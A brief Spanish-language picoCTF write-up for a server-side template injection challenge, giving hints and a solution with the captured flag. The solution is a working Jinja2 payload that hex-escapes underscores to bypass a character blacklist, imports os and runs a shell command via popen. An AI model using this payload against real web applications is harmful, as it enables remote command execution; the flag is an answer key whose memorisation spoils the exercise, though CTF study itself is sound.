## Descripción:


Hints:
- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?

## Solución:
```
Se puso esto de injection:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

picoCTF{sst1_f1lt3r_byp4ss_ece726e9}

```

